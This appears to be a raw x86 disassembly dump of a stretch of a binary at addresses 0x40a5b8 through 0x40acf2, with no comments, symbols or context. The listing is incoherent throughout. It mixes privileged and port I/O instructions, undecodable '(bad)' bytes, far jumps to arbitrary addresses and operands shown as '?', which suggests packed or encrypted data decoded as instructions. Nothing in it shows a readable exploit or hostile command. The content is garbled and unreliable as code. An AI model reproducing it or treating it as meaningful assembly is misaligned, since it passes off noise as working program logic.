  40a5b8:	sahf   
  40a5b9:	push   ebp
  40a5ba:	xor    al,0xf0
  40a5bc:	movnti DWORD PTR [ecx+0x62c6539e],edi
  40a5c3:	sub    dh,BYTE PTR [eax-0x29]
  40a5c6:	ret    
  40a5c7:	sahf   
  40a5c8:	lahf   
  40a5c9:	push   edi
  40a5ca:	aam    0x35
  40a5cc:	and    BYTE PTR [edx-0x3b],dh
  40a5cf:	dec    eax
  40a5d0:	lock mov bh,ch
  40a5d3:	add    DWORD PTR [edx+edi*4],eax
  40a5d6:	pop    ss
  40a5d7:	cdq    
  40a5d8:	pop    ebx
  40a5d9:	xor    eax,0xa6c1fa05
  40a5de:	jnp    0x40a61c
  40a5e0:	adc    al,0xb
  40a5e2:	sub    ecx,ebp
  40a5e4:	popa   
  40a5e5:	loopne 0x40a5c4
  40a5e7:	pop    ebp
  40a5e8:	mov    ebx,0x16628c4a
  40a5ed:	cmp    eax,0x8eae8ed
  40a5f2:	lea    ebp,[esi-0x4b536be]
  40a5f8:	pop    ss
  40a5f9:	out    dx,eax
  40a5fa:	je     0x40a660
  40a5fc:	shr    DWORD PTR [edi+0x7906246b],cl
  40a602:	popf   
  40a603:	sub    eax,0xbdcbef06
  40a608:	(bad)
  40a60c:	in     al,dx
  40a60d:	sbb    eax,0x788b6a03
  40a612:	mov    cs,WORD PTR [eax+edi*4-0xd]
  40a616:	inc    esi
  40a617:	das    
  40a618:	in     al,0x99
  40a61a:	mov    edi,0x4b547fdd
  40a61f:	dec    ebp
  40a620:	ss xchg edx,eax
  40a622:	or     DWORD PTR [edx],edi
  40a624:	pop    edx
  40a625:	jg     0x40a5e1
  40a627:	mul    BYTE PTR [edx-0x48988f72]
  40a62d:	int    0xa5
  40a62f:	push   0x52
  40a631:	xor    DWORD PTR [ebp+edi*4+0x52],ebx
  40a635:	nop
  40a636:	adc    DWORD PTR [edx-0x20],edx
  40a639:	test   edx,esp
  40a63b:	sub    DWORD PTR [ebx],0xd1feb8b2
  40a641:	dec    esp
  40a642:	or     BYTE PTR [edi+0x14],ah
  40a645:	sbb    dl,BYTE PTR [ebx-0x44b63ab9]
  40a64b:	push   ecx
  40a64c:	mov    ds:0xbf554a93,al
  40a651:	mov    ebp,0xc0e81351
  40a656:	inc    DWORD PTR [ecx+0x78d49cdb]
  40a65c:	(bad)  
  40a65d:	into   
  40a65e:	xchg   esi,eax
  40a65f:	push   ebp
  40a660:	xor    eax,0x8600a590
  40a665:	pop    ecx
  40a666:	sub    eax,0x8dfe869c
  40a66b:	jnp    0x40a69a
  40a66d:	les    edi,FWORD PTR [ebx]
  40a66f:	dec    BYTE PTR [eax]
  40a671:	repnz dec ecx
  40a673:	xchg   edx,eax
  40a674:	sub    bl,BYTE PTR [ecx-0x26f84b75]
  40a67a:	popf   
  40a67b:	sbb    DWORD PTR [ebx],0xf3d821e1
  40a681:	or     cl,BYTE PTR [ebp-0x7824b286]
  40a687:	leave  
  40a688:	cmp    bl,dh
  40a68a:	mov    ecx,0x6f250516
  40a68f:	lea    ebp,[eax+0x3]
  40a692:	cmp    BYTE PTR [eax+esi*4],0x93
  40a696:	adc    DWORD PTR [eax],ebp
  40a698:	jnp    0x40a661
  40a69a:	push   ss
  40a69b:	int    0xfd
  40a69d:	lock push ebp
  40a69f:	inc    ebx
  40a6a0:	lods   eax,DWORD PTR ds:[esi]
  40a6a1:	mov    ch,0xd7
  40a6a3:	test   edi,ebx
  40a6a5:	retf   
  40a6a6:	fadd   st(7),st
  40a6a8:	push   eax
  40a6a9:	inc    esp
  40a6aa:	cmp    dl,BYTE PTR [esi-0xf]
  40a6ad:	pop    edi
  40a6ae:	mov    cl,0x1e
  40a6b0:	inc    edi
  40a6b1:	in     al,dx
  40a6b2:	add    ch,BYTE PTR [edx+0xc]
  40a6b5:	leave  
  40a6b6:	mov    edi,0x63613573
  40a6bb:	loop   0x40a650
  40a6bd:	push   0x22
  40a6bf:	mov    eax,ds:0xaab1453f
  40a6c4:	xor    al,bh
  40a6c6:	pop    ss
  40a6c7:	cmp    eax,0xcab15cf5
  40a6cc:	mov    eax,0x75ac3a53
  40a6d1:	pop    esi
  40a6d2:	inc    ecx
  40a6d3:	adc    BYTE PTR [esi+esi*8+0x51cf5d38],0x5e
  40a6db:	test   ch,0x9e
  40a6de:	(bad)  
  40a6df:	mov    edi,0xf7278e5c
  40a6e4:	loopne 0x40a66d
  40a6e6:	mov    eax,ds:0xf70a6405
  40a6eb:	pushf  
  40a6ec:	mov    ebx,0x1236c7a4
  40a6f1:	adc    eax,DWORD PTR [ebp+0x606b7538]
  40a6f7:	stos   BYTE PTR es:[edi],al
  40a6f8:	rol    BYTE PTR [esi],cl
  40a6fa:	cmp    eax,0x458ec66d
  40a6ff:	fcomp  DWORD PTR [ebp-0x1bfbd891]
  40a705:	cli    
  40a706:	mov    bh,0xc6
  40a708:	push   ecx
  40a709:	sub    ecx,DWORD PTR [edi+ecx*8-0x6ae06cb0]
  40a710:	mov    esi,0x92af329f
  40a715:	popf   
  40a716:	pushf  
  40a717:	lea    esp,[edi+eiz*8+0x33]
  40a71b:	outs   dx,DWORD PTR ds:[esi]
  40a71c:	push   ss
  40a71d:	cdq    
  40a71e:	cmp    esi,esi
  40a720:	leave  
  40a721:	data16 (bad) 
  40a723:	mov    al,0x61
  40a725:	scas   eax,DWORD PTR es:[edi]
  40a726:	mov    ?,edx
  40a728:	xchg   ebp,eax
  40a729:	adc    eax,0x2ca9c736
  40a72e:	jb     0x40a6bb
  40a730:	and    eax,0x26d5293f
  40a735:	enter  0x5955,0x1d
  40a739:	jl     0x40a7b2
  40a73b:	or     al,0x4a
  40a73d:	xchg   esp,eax
  40a73e:	out    dx,al
  40a73f:	push   0xe2b07dbb
  40a744:	mov    DWORD PTR [esi-0x38],ebp
  40a747:	setno  ah
  40a74a:	jl     0x40a710
  40a74c:	call   0x94ec19fe
  40a751:	adc    al,0x20
  40a753:	mov    gs,eax
  40a755:	imul   ecx,DWORD PTR [ebp+0x29],0xbcd283a7
  40a75c:	and    esi,DWORD PTR [ecx]
  40a75e:	and    ch,BYTE PTR [edi-0x6d]
  40a761:	mov    ebx,0xcf450cc
  40a766:	pop    es
  40a767:	adc    BYTE PTR [ecx-0x37],bl
  40a76a:	push   ss
  40a76b:	ins    DWORD PTR es:[edi],dx
  40a76c:	jb     0x40a70a
  40a76e:	add    BYTE PTR [ebx+0x15],ch
  40a771:	je     0x40a74c
  40a773:	mov    ebp,0xbd35112
  40a778:	pop    edx
  40a779:	inc    esp
  40a77a:	mov    ebx,DWORD PTR [ebx-0x58]
  40a77d:	fdiv   DWORD PTR [eax]
  40a77f:	test   BYTE PTR [eax+0x23],bh
  40a782:	loope  0x40a7a2
  40a784:	ficom  WORD PTR [edi+0x5518a02]
  40a78a:	ins    BYTE PTR es:[edi],dx
  40a78b:	xchg   ecx,eax
  40a78c:	xchg   ebp,eax
  40a78d:	xor    DWORD PTR ds:0x8d492664,ecx
  40a793:	xchg   BYTE PTR [esi+0x6d86978],bh
  40a799:	or     DWORD PTR [ebx-0x46],esp
  40a79c:	in     eax,dx
  40a79d:	(bad)  
  40a79e:	push   ecx
  40a79f:	mov    ds:0x7e4db915,eax
  40a7a4:	mov    al,0xf8
  40a7a6:	cwde   
  40a7a7:	mov    ah,0x81
  40a7a9:	push   ebx
  40a7aa:	jno    0x40a7f7
  40a7ac:	leave  
  40a7ad:	inc    eax
  40a7ae:	pop    esi
  40a7af:	xchg   edx,eax
  40a7b0:	mov    esp,0xde997177
  40a7b5:	cmp    bl,BYTE PTR es:[ebx]
  40a7b8:	push   ebx
  40a7b9:	and    al,BYTE PTR [eax+0x72a7a4a7]
  40a7bf:	fldenv [eax-0x622838e9]
  40a7c5:	mov    al,ds:0x79309fda
  40a7ca:	and    BYTE PTR [ecx],al
  40a7cc:	mov    al,0x4
  40a7ce:	in     eax,dx
  40a7cf:	loope  0x40a7e9
  40a7d1:	sbb    ebx,DWORD PTR [esi+0x6f70fa5c]
  40a7d7:	outs   dx,BYTE PTR ds:[esi]
  40a7d8:	push   esp
  40a7d9:	jo     0x40a7c4
  40a7db:	and    eax,0x96063b4d
  40a7e0:	adc    DWORD PTR [ecx],0x2acd0eb9
  40a7e6:	pop    ecx
  40a7e7:	fisubr WORD PTR [edi]
  40a7e9:	cmp    BYTE PTR [edi],al
  40a7eb:	jno    0x40a861
  40a7ed:	outs   dx,BYTE PTR ds:[esi]
  40a7ee:	or     BYTE PTR [ecx+0x4074b0b5],0x84
  40a7f5:	inc    eax
  40a7f6:	adc    ebx,DWORD PTR [edi-0x7a]
  40a7f9:	retf   0x67ed
  40a7fc:	pushf  
  40a7fd:	sahf   
  40a7fe:	scas   eax,DWORD PTR es:[edi]
  40a7ff:	xchg   ebx,eax
  40a800:	or     eax,0x24cdc2d
  40a805:	inc    edi
  40a806:	jle    0x40a83c
  40a808:	jge    0x40a7c0
  40a80a:	lea    edx,[eax-0x33]
  40a80d:	pop    eax
  40a80e:	mov    al,0x4
  40a810:	(bad)  
  40a811:	retf   0x551
  40a814:	jecxz  0x40a842
  40a816:	rcr    DWORD PTR [edx+0x2d756d0f],cl
  40a81c:	adc    DWORD PTR [ebp-0x1797903e],ebx
  40a822:	outs   dx,BYTE PTR ds:[esi]
  40a823:	ja     0x40a867
  40a825:	lds    edx,FWORD PTR fs:[edi+0x7eeff064]
  40a82c:	div    ebx
  40a82e:	dec    esp
  40a82f:	sar    DWORD PTR [edi],0x33
  40a832:	xor    al,0x64
  40a834:	and    DWORD PTR [ebx],eax
  40a836:	fs add dl,dl
  40a839:	icebp  
  40a83a:	fsub   DWORD PTR [esi-0x8e3c91c]
  40a840:	inc    dl
  40a842:	lods   eax,DWORD PTR ds:[esi]
  40a843:	mov    esp,0x585c0f96
  40a848:	bound  ebx,QWORD PTR [esi+0x65]
  40a84b:	push   es
  40a84c:	inc    eax
  40a84d:	cmp    al,BYTE PTR [ebp-0xdd9c194]
  40a853:	test   eax,0xe06968ac
  40a858:	mov    ecx,0xe0143fe1
  40a85d:	out    0xbd,eax
  40a85f:	lahf   
  40a860:	dec    ebx
  40a861:	or     ah,ch
  40a863:	fcom   st(7)
  40a865:	into   
  40a866:	loope  0x40a81a
  40a868:	dec    ebp
  40a869:	xchg   ebx,eax
  40a86a:	fisub  WORD PTR [ecx+0x7e]
  40a86d:	int    0x74
  40a86f:	sub    esi,DWORD PTR [ebx-0xc]
  40a872:	out    dx,eax
  40a873:	add    cl,BYTE PTR [ebp+0x726b9789]
  40a879:	out    dx,eax
  40a87a:	ja     0x40a81b
  40a87c:	inc    esp
  40a87d:	pop    ds
  40a87e:	mov    edi,0x5da021f8
  40a883:	push   ebx
  40a884:	adc    esp,esi
  40a886:	nop
  40a887:	mov    ah,0x45
  40a889:	mov    ecx,0xb2aa53ff
  40a88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a88f:	push   ebx
  40a890:	in     al,0x2a
  40a892:	dec    eax
  40a893:	rcl    DWORD PTR [edx],cl
  40a895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a896:	mov    edi,0xc54895e
  40a89b:	cmp    BYTE PTR [edi-0x1a7443d2],0x77
  40a8a2:	add    al,0xd
  40a8a4:	or     BYTE PTR [ecx-0x22],bh
  40a8a7:	xor    cl,ch
  40a8a9:	test   bh,dl
  40a8ab:	enter  0x89f1,0xff
  40a8af:	pushf  
  40a8b0:	aas    
  40a8b1:	ss dec ebp
  40a8b3:	or     al,0xa
  40a8b5:	xchg   esp,eax
  40a8b6:	mul    BYTE PTR [ebp-0x4e]
  40a8b9:	js     0x40a847
  40a8bb:	(bad)  
  40a8bc:	dec    ebp
  40a8bd:	push   ebp
  40a8be:	in     eax,dx
  40a8bf:	jge    0x40a871
  40a8c1:	adc    al,0x22
  40a8c3:	sub    bh,BYTE PTR [ebp+0x6f]
  40a8c6:	ret    
  40a8c7:	int    0x23
  40a8c9:	mov    esi,0x7524b00c
  40a8ce:	(bad)  
  40a8cf:	retf   
  40a8d0:	gs cld 
  40a8d2:	les    ebp,FWORD PTR [esi-0x5f]
  40a8d5:	mov    bh,0xdf
  40a8d7:	sub    DWORD PTR [ecx+eiz*4-0x5b1d15d],eax
  40a8de:	pop    ecx
  40a8df:	adc    ecx,ebx
  40a8e1:	mov    WORD PTR [ebx],cs
  40a8e3:	mov    ah,0xc3
  40a8e5:	sbb    eax,0xd8ae4fd9
  40a8ea:	mov    ah,0x95
  40a8ec:	ror    esp,0x2d
  40a8ef:	ja     0x40a8a4
  40a8f1:	jb     0x40a8a2
  40a8f3:	pop    es
  40a8f4:	mov    eax,0x6b0ff6bb
  40a8f9:	in     eax,0xea
  40a8fb:	jge    0x40a92e
  40a8fd:	push   0x76172887
  40a902:	cld    
  40a903:	cmp    al,0xee
  40a905:	sbb    BYTE PTR [ebp+edx*1-0x7e8d5ecd],cl
  40a90c:	data16 sti 
  40a90e:	shl    DWORD PTR [ecx],cl
  40a910:	sbb    BYTE PTR [eax+0xd15cd0],bh
  40a916:	jg     0x40a8c8
  40a918:	fdivr  DWORD PTR [edx]
  40a91a:	jne    0x40a8a5
  40a91c:	call   0x7b27:0xf1d01d92
  40a923:	popa   
  40a924:	adc    DWORD PTR [eax-0x25],0xaf2f49a4
  40a92b:	(bad)  
  40a92c:	mov    dl,0xb3
  40a92e:	test   DWORD PTR [ecx+0x2e1f05a8],esi
  40a934:	div    BYTE PTR [esi]
  40a936:	ins    DWORD PTR es:[edi],dx
  40a937:	push   edx
  40a938:	sub    BYTE PTR [ecx+0x68],dh
  40a93b:	dec    edi
  40a93c:	push   edx
  40a93d:	cmp    al,0xe3
  40a93f:	push   cs
  40a940:	adc    ecx,DWORD PTR [esi+0x1a]
  40a943:	xor    ah,dl
  40a945:	shl    al,cl
  40a947:	int3   
  40a948:	scas   al,BYTE PTR es:[edi]
  40a949:	sar    DWORD PTR [ebp-0x39bf10d4],cl
  40a94f:	xor    edx,DWORD PTR [eax]
  40a951:	cmp    DWORD PTR [edx],ebp
  40a953:	out    dx,eax
  40a954:	ror    bh,0xf0
  40a957:	fnstcw WORD PTR [esi]
  40a959:	cmp    BYTE PTR [edx+0x71a485ed],ah
  40a95f:	add    esi,DWORD PTR [esi+0x6a842a0d]
  40a965:	cmp    esi,DWORD PTR [eax]
  40a967:	sbb    al,0x72
  40a969:	icebp  
  40a96a:	dec    DWORD PTR [esi+ebp*1-0xc]
  40a96e:	inc    eax
  40a96f:	pop    ds
  40a970:	iret   
  40a971:	jae    0x40a9b0
  40a973:	jmp    0x52371645
  40a978:	pop    eax
  40a979:	xor    cl,BYTE PTR [eax]
  40a97b:	adc    eax,0x6deb39b9
  40a980:	mov    ah,0xc7
  40a982:	sar    DWORD PTR [ecx+0x4b14c4e8],1
  40a988:	in     eax,0xb7
  40a98a:	nop
  40a98b:	aas    
  40a98c:	aaa    
  40a98d:	sar    DWORD PTR [edx],1
  40a98f:	fsub   st(3),st
  40a991:	imul   esi,DWORD PTR [esi],0x2efcf71f
  40a997:	jge    0x40a9c5
  40a999:	int3   
  40a99a:	(bad)  
  40a99b:	fisttp WORD PTR [ebx]
  40a99d:	jmp    0xbb4882c7
  40a9a2:	shl    DWORD PTR [ebx+edx*4-0x60614638],cl
  40a9a9:	ficomp WORD PTR [esi]
  40a9ab:	xchg   ecx,eax
  40a9ac:	and    cl,dl
  40a9ae:	pop    ebx
  40a9af:	dec    ebp
  40a9b0:	fsubr  DWORD PTR [ebx+eax*8-0x6a]
  40a9b4:	xor    BYTE PTR [ebp+0x5d8f0e64],0x86
  40a9bb:	adc    eax,0xe5ea53c4
  40a9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c2:	cdq    
  40a9c3:	test   al,0x7b
  40a9c5:	das    
  40a9c6:	ret    0xc912
  40a9c9:	dec    ebx
  40a9ca:	and    al,0x4d
  40a9cc:	xlat   BYTE PTR ds:[ebx]
  40a9cd:	popf   
  40a9ce:	lods   eax,DWORD PTR ds:[esi]
  40a9cf:	cmp    DWORD PTR [edi+esi*8],ecx
  40a9d2:	xor    eax,ecx
  40a9d4:	cli    
  40a9d5:	xchg   esi,eax
  40a9d6:	and    ch,BYTE PTR [esi+0x2]
  40a9d9:	push   es
  40a9da:	ja     0x40aa3c
  40a9dc:	loop   0x40aa1f
  40a9de:	std    
  40a9df:	cmp    ebp,DWORD PTR [edx-0x2]
  40a9e2:	xchg   bh,bl
  40a9e4:	hlt    
  40a9e5:	add    eax,0xcc4f4fad
  40a9ea:	and    BYTE PTR [eax-0x3f],ah
  40a9ed:	dec    esi
  40a9ee:	mov    cl,0x9f
  40a9f0:	push   edi
  40a9f1:	outs   dx,BYTE PTR ds:[esi]
  40a9f2:	int3   
  40a9f3:	jl     0x40a9f4
  40a9f5:	jno    0x40a9af
  40a9f7:	fcomi  st,st(6)
  40a9f9:	pop    eax
  40a9fa:	not    BYTE PTR [ebp+0x1dd6fc2d]
  40aa00:	ret    
  40aa01:	das    
  40aa02:	sbb    esi,ebx
  40aa04:	repnz (bad) 
  40aa06:	push   edi
  40aa07:	aaa    
  40aa08:	pop    ss
  40aa09:	inc    esp
  40aa0a:	aaa    
  40aa0b:	adc    al,0xbb
  40aa0d:	out    0x25,eax
  40aa0f:	ror    ebp,cl
  40aa11:	pop    eax
  40aa12:	mov    ss,edi
  40aa14:	sub    DWORD PTR [eax+eiz*4],edi
  40aa17:	sub    esp,DWORD PTR [esi+0x73803b24]
  40aa1d:	neg    DWORD PTR [edx-0x3d]
  40aa20:	inc    edx
  40aa21:	out    0xae,al
  40aa23:	int    0x68
  40aa25:	sbb    ebx,DWORD PTR [ecx]
  40aa27:	inc    esp
  40aa28:	cmc    
  40aa29:	push   ebx
  40aa2a:	out    0x83,eax
  40aa2c:	pop    esp
  40aa2d:	xchg   ebp,eax
  40aa2e:	scas   al,BYTE PTR es:[edi]
  40aa2f:	mov    eax,DWORD PTR [edx+0x2]
  40aa32:	shl    ch,1
  40aa34:	add    al,0xc7
  40aa36:	adc    ebp,ebp
  40aa38:	jbe    0x40a9e0
  40aa3a:	(bad)  
  40aa3b:	es (bad) 
  40aa3d:	loop   0x40a9e2
  40aa3f:	push   ss
  40aa40:	cdq    
  40aa41:	sbb    DWORD PTR [edx+0x4a8ec18a],edi
  40aa47:	pop    ds
  40aa48:	xchg   ebx,eax
  40aa49:	sub    eax,0xaf624cc3
  40aa4e:	test   DWORD PTR [edi+ebx*4],edx
  40aa51:	sub    eax,eax
  40aa53:	pusha  
  40aa54:	push   ebp
  40aa55:	adc    BYTE PTR ds:0x2f26105,bh
  40aa5b:	stos   DWORD PTR es:[edi],eax
  40aa5c:	leave  
  40aa5d:	push   edx
  40aa5e:	jl     0x40aa50
  40aa60:	lods   eax,DWORD PTR ds:[esi]
  40aa61:	mov    ds:0x729937c2,al
  40aa66:	jmp    0x286c:0x4567aff1
  40aa6d:	lahf   
  40aa6e:	jp     0x40aaaa
  40aa70:	les    esp,FWORD PTR [ebp-0x73addb56]
  40aa76:	cmc    
  40aa77:	inc    edx
  40aa78:	shr    BYTE PTR [eax-0x1d7c565d],0xea
  40aa7f:	clc    
  40aa80:	arpl   WORD PTR [esi-0x32],bx
  40aa83:	xor    eax,0xb8321102
  40aa88:	out    0x11,al
  40aa8a:	push   ds
  40aa8b:	mov    bh,0x56
  40aa8d:	lods   al,BYTE PTR ds:[esi]
  40aa8e:	out    dx,eax
  40aa8f:	pop    ebp
  40aa90:	in     al,dx
  40aa91:	fdivp  st(1),st
  40aa93:	out    dx,eax
  40aa94:	push   esi
  40aa95:	sahf   
  40aa96:	scas   eax,DWORD PTR es:[edi]
  40aa97:	cmp    dh,ah
  40aa99:	cmp    DWORD PTR [esi],eax
  40aa9b:	jo     0x40ab11
  40aa9d:	rcl    edi,0xb1
  40aaa0:	dec    esp
  40aaa1:	lea    edi,[esi+ebp*2]
  40aaa4:	sar    BYTE PTR [edx+0x60ed8963],1
  40aaaa:	js     0x40ab0e
  40aaac:	add    DWORD PTR [edi],edi
  40aaae:	dec    ebx
  40aaaf:	xchg   ebp,eax
  40aab0:	aaa    
  40aab1:	adc    cl,ah
  40aab3:	pop    ebx
  40aab4:	inc    ecx
  40aab5:	leave  
  40aab6:	lahf   
  40aab7:	popa   
  40aab8:	push   es
  40aab9:	push   0xffffff9d
  40aabb:	je     0x40aa44
  40aabd:	jge    0x40aafd
  40aabf:	or     al,0xa7
  40aac1:	rsm    
  40aac3:	and    BYTE PTR [ebx],ah
  40aac5:	pop    ebp
  40aac6:	ins    BYTE PTR es:[edi],dx
  40aac7:	les    ebp,FWORD PTR [eax-0x43be14a2]
  40aacd:	adc    eax,edx
  40aacf:	sub    BYTE PTR [eax+0x376af23a],0xda
  40aad6:	jecxz  0x40aae8
  40aad8:	dec    ecx
  40aad9:	mov    ds:0x5d739556,eax
  40aade:	lock cmc 
  40aae0:	xor    edi,ebp
  40aae2:	stc    
  40aae3:	inc    edx
  40aae4:	add    BYTE PTR [edx],dh
  40aae6:	push   ebp
  40aae7:	sub    ecx,esi
  40aae9:	test   BYTE PTR [ebx],0x7d
  40aaec:	fs pop ecx
  40aaee:	xchg   ebx,eax
  40aaef:	adc    DWORD PTR [ebx],edx
  40aaf1:	lods   eax,DWORD PTR ds:[esi]
  40aaf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf3:	mov    cl,bh
  40aaf5:	add    DWORD PTR [ebx+0x7b5d8a63],ebx
  40aafb:	dec    edx
  40aafc:	adc    al,0x6e
  40aafe:	jb     0x40aae7
  40ab00:	pop    ss
  40ab01:	mov    esp,0x63e4f331
  40ab06:	xchg   ebp,eax
  40ab07:	pop    ebp
  40ab08:	lea    ebx,[esi]
  40ab0a:	jno    0x40aa9f
  40ab0c:	sahf   
  40ab0d:	ja     0x40aaf5
  40ab0f:	pushf  
  40ab10:	sbb    DWORD PTR [edi+0x6e],eax
  40ab13:	fidiv  WORD PTR [esi+edx*8-0x16]
  40ab17:	cmp    al,0xc3
  40ab19:	or     bl,bl
  40ab1b:	mov    al,0x6
  40ab1d:	in     al,0xce
  40ab1f:	mov    ebp,DWORD PTR [edi+0x7b]
  40ab22:	ins    BYTE PTR es:[edi],dx
  40ab23:	cdq    
  40ab24:	(bad)  
  40ab25:	mov    esp,0xa532dcef
  40ab2a:	jne    0x40ab9b
  40ab2c:	iret   
  40ab2d:	xchg   ebx,eax
  40ab2e:	es pop ebp
  40ab30:	gs jb  0x40aad3
  40ab33:	and    cl,BYTE PTR [ebp-0x4da23e4]
  40ab39:	dec    esp
  40ab3a:	jb     0x40ab12
  40ab3c:	(bad)  
  40ab3d:	cmp    eax,DWORD PTR [ebx-0x40]
  40ab40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab41:	mov    ds:0x1a68eb78,eax
  40ab46:	stos   DWORD PTR es:[edi],eax
  40ab47:	imul   esp,esp,0x7d
  40ab4a:	lahf   
  40ab4b:	cmp    ebx,DWORD PTR [ebp-0x1]
  40ab4e:	imul   esi,DWORD PTR [esi-0x5c35aa3b],0xae641461
  40ab58:	pop    ss
  40ab59:	push   edx
  40ab5a:	jg     0x40abbb
  40ab5c:	arpl   WORD PTR [ecx+0x1f],bp
  40ab5f:	mov    dl,0x6d
  40ab61:	pop    ss
  40ab62:	push   ebp
  40ab63:	(bad)  
  40ab64:	(bad)  
  40ab65:	mov    edx,0x433c9fba
  40ab6a:	jecxz  0x40aaf4
  40ab6c:	lea    esp,[ecx]
  40ab6e:	mov    ds:0xcd31b81d,eax
  40ab73:	popf   
  40ab74:	or     ah,al
  40ab76:	outs   dx,BYTE PTR ds:[esi]
  40ab77:	sbb    ch,ah
  40ab79:	jbe    0x40ab5f
  40ab7b:	stos   BYTE PTR es:[edi],al
  40ab7c:	dec    ebp
  40ab7d:	xchg   edi,eax
  40ab7e:	inc    ebx
  40ab7f:	loope  0x40abe6
  40ab81:	fisubr WORD PTR [eax-0x25345585]
  40ab87:	or     eax,0xcddb1ca8
  40ab8c:	xor    al,0x23
  40ab8e:	push   ebp
  40ab8f:	addr16 mov dh,ah
  40ab92:	lock pop es
  40ab94:	and    eax,0x910510d3
  40ab99:	into   
  40ab9a:	add    bh,BYTE PTR [ebp+0x1]
  40ab9d:	out    0x69,eax
  40ab9f:	call   0x51a2bfab
  40aba4:	or     BYTE PTR [eax-0x52],0xcc
  40aba8:	mov    dl,0x1d
  40abaa:	sub    al,0x7
  40abac:	xchg   BYTE PTR [esi],al
  40abae:	ret    
  40abaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb0:	jmp    0x673f8118
  40abb5:	enter  0xaa7d,0x72
  40abb9:	push   cs
  40abba:	sar    DWORD PTR [edi+0x56405a34],1
  40abc0:	sub    al,0xe1
  40abc2:	lods   eax,DWORD PTR ds:[esi]
  40abc3:	inc    eax
  40abc4:	ds push ss
  40abc6:	jnp    0x40ac1c
  40abc8:	pushf  
  40abc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abca:	mov    al,0x5a
  40abcc:	sbb    eax,0xc8d5ba03
  40abd1:	xchg   edi,eax
  40abd2:	sbb    ecx,0xffffffc9
  40abd5:	sahf   
  40abd6:	mov    fs,WORD PTR [ecx-0x1dea8fc1]
  40abdc:	push   0x7f277c13
  40abe1:	addr16 mov ecx,esi
  40abe4:	pop    esp
  40abe5:	cld    
  40abe6:	ss dec edx
  40abe8:	loop   0x40ab9a
  40abea:	or     esp,DWORD PTR [ebp+0x111217a5]
  40abf0:	cmp    BYTE PTR [ecx],cl
  40abf2:	rcr    BYTE PTR [esi],0x45
  40abf5:	stc    
  40abf6:	gs das 
  40abf8:	fsubr  st(2),st
  40abfa:	xor    al,0x62
  40abfc:	out    dx,al
  40abfd:	jl     0x40ac74
  40abff:	cmc    
  40ac00:	lea    edi,[ebx+0x1402163c]
  40ac06:	retf   0x1e4a
  40ac09:	dec    esi
  40ac0a:	jecxz  0x40abd4
  40ac0c:	gs sahf 
  40ac0e:	jge    0x40ac4c
  40ac10:	mov    ds:0x9e5f3485,al
  40ac15:	sub    edx,DWORD PTR [edi-0x22]
  40ac18:	mov    ah,0x3a
  40ac1a:	xor    al,0x58
  40ac1c:	fwait
  40ac1d:	das    
  40ac1e:	pop    eax
  40ac1f:	pop    ds
  40ac20:	ret    
  40ac21:	pushf  
  40ac22:	inc    esi
  40ac23:	jo     0x40ac3d
  40ac25:	inc    edi
  40ac26:	jg     0x40ac3e
  40ac28:	xor    al,cl
  40ac2a:	cs out dx,eax
  40ac2c:	push   ss
  40ac2d:	mov    dh,0x21
  40ac2f:	or     edi,DWORD PTR [ebp+eiz*2-0x34]
  40ac33:	jecxz  0x40ac6e
  40ac35:	adc    DWORD PTR [esp+eiz*2-0x5],0x70
  40ac3a:	adc    eax,0xe5991a2d
  40ac3f:	sbb    eax,0x8e757a2
  40ac44:	jmp    0xbae5:0x410712d8
  40ac4b:	pop    ebp
  40ac4c:	je     0x40ac8d
  40ac4e:	jecxz  0x40ac24
  40ac50:	mov    al,0x87
  40ac52:	dec    ecx
  40ac53:	adc    al,0x9c
  40ac55:	push   ss
  40ac56:	inc    esp
  40ac57:	sti    
  40ac58:	adc    al,0xc5
  40ac5a:	push   0x5b8b256c
  40ac5f:	retf   
  40ac60:	into   
  40ac61:	xor    ah,BYTE PTR [ecx]
  40ac63:	and    al,0x77
  40ac65:	dec    ecx
  40ac66:	mov    esi,?
  40ac68:	into   
  40ac69:	dec    ebx
  40ac6a:	lods   eax,DWORD PTR ds:[esi]
  40ac6b:	enter  0x8c2,0xb1
  40ac6f:	xchg   ecx,eax
  40ac70:	mov    cl,BYTE PTR [eax+0x57]
  40ac73:	mov    dh,0xb0
  40ac75:	idiv   al
  40ac77:	jmp    0x40acda
  40ac79:	sbb    DWORD PTR [edx-0x76],edi
  40ac7c:	(bad)  
  40ac7d:	clc    
  40ac7e:	mov    ch,0xdb
  40ac80:	mov    bh,0xb3
  40ac82:	enter  0x5fbb,0xd1
  40ac86:	(bad)  
  40ac88:	jg     0x40acbc
  40ac8a:	test   eax,0x82878034
  40ac8f:	(bad)  
  40ac91:	mov    bl,0xa8
  40ac93:	mov    esp,esp
  40ac95:	gs jns 0x40ac9f
  40ac98:	xor    DWORD PTR [ecx],0xd62e13ee
  40ac9e:	or     BYTE PTR [ebx],0x2c
  40aca1:	scas   ax,WORD PTR es:[edi]
  40aca3:	sub    DWORD PTR [esi-0x23dc400a],eax
  40aca9:	add    ebp,DWORD PTR [ebp+0x4b70a166]
  40acaf:	clc    
  40acb0:	cmp    al,0x8
  40acb2:	add    eax,0x4bae995a
  40acb7:	mov    BYTE PTR [edx-0x26133883],dl
  40acbd:	imul   ebp,DWORD PTR [edx+0x19794628],0xffffff96
  40acc4:	push   0xa63470d7
  40acc9:	ss out 0x45,al
  40accc:	dec    edi
  40accd:	adc    al,BYTE PTR ss:[esi+eiz*8]
  40acd1:	push   0x7e
  40acd3:	sahf   
  40acd4:	mov    al,0x24
  40acd6:	shr    DWORD PTR [ecx+edi*2],cl
  40acd9:	cmp    al,0x4d
  40acdb:	cld    
  40acdc:	cdq    
  40acdd:	or     BYTE PTR [edx],dh
  40acdf:	inc    edi
  40ace0:	cmp    al,0x45
  40ace2:	outs   dx,BYTE PTR ds:[esi]
  40ace3:	xor    esp,edi
  40ace5:	add    eax,0x1a681d06
  40acea:	mov    al,BYTE PTR [edi]
  40acec:	inc    esi
  40aced:	or     edi,edx
  40acef:	inc    ecx
  40acf0:	xchg   esp,eax
  40acf1:	cwde   
  40acf2:	mov    ecx,0xf2a844f5
